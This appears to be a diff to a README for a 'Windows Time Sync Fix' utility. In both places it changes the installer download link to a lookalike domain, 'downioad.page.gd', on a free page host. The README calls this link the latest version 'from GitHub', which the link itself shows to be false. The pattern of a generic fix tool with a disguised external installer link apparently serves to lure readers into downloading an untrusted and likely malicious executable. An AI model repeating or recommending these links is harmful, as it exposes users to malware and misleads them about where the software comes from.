@@ -2,7 +2,7 @@
 
 Windows Time Sync Fix is a dedicated utility designed to address and resolve time synchronization issues on Windows 10 and Windows 11 systems. This tool ensures your system clock remains accurate by fixing common errors related to time synchronization, preventing problems like incorrect time display or sync failures.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 Before proceeding, ensure your system meets the following requirements for optimal performance:
@@ -48,7 +48,7 @@ Here are answers to some common queries:
 ## Download
 For the latest version, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
 
